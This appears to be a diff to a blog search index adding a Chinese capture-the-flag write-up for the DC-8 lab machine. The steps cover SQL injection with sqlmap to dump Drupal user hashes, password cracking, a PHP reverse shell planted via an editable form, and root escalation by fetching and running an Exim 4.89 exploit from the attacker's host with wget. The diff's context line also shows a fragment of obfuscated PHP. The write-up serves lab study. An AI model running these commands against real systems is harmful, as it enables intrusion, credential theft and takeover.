@@ -2377,4 +2377,104 @@ $R=$Z('',$X);$R();
         <tag>工具手册</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DCchallenges8</title>
+    <url>/posts/437699f/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
+<p>网段     192.168.18.0/24</p>
+<p>kali        192.168.18.131</p>
+<p>靶机        192.168.18.141</p>
+</blockquote>
+<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
+</blockquote>
+<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
+<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
+</blockquote>
+<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
+<p>sudo python3 dirsearch -u 192.168.18.141</p>
+</blockquote>
+<p>没扫到什么东西，换dirb扫到了</p>
+<p><code>http://192.168.18.141/user</code></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
+<p>sqlmap跑一下</p>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
+<blockquote>
+<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
+</blockquote>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
+<blockquote>
+<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
+</blockquote>
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
+<blockquote>
+<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
+</blockquote>
+<br/>
+
+<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
+<blockquote>
+<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
+</blockquote>
+<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
+<br/>
+
+<p><code>admin</code> 使用john没跑出来</p>
+<p><code>john</code> 密码为<code>turtle</code></p>
+<p><code>http://192.168.18.141/user/</code>登录成功</p>
+<p>打开content看看</p>
+<p><img src="content.png"></p>
+<br/>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
+<p>修改成php格式</p>
+<p><img src="ncshell.png"></p>
+<p><img src="submit.png"></p>
+<p>反弹交互shell</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><img src="python_shell.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
+<p><img src="find.png"></p>
+<p>试着利用下exim4</p>
+<p>查看exim4版本</p>
+<p><code>exim4 --version</code></p>
+<blockquote>
+<p>Exim version 4.89 </p>
+</blockquote>
+<p><code>searchsploit  exim 4</code></p>
+<p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
+<blockquote>
+<p>cp /usr/share/exploitdb/exploits/linux/local/46996.sh dc8.sh</p>
+<p>python2 -m SimpleHTTPServer</p>
+</blockquote>
+<p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
+<blockquote>
+<p>wget <a href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
+</blockquote>
+<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
+<blockquote>
+<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
+</blockquote>
+<p>看下提示用法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 &#x2F;tmp&#x2F;pwned</span><br><span class="line"># # id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid&#x3D;1000(raptor) gid&#x3D;1000(raptor) groups&#x3D;1000(raptor) [...]</span><br><span class="line"># $ .&#x2F;raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="flag.png"></p>
+<br/>
+
+<br/>
+
+<blockquote>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
+<p><a href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>DCchallenges</category>
+      </categories>
+      <tags>
+        <tag>DCchallenges</tag>
+      </tags>
+  </entry>
 </search>
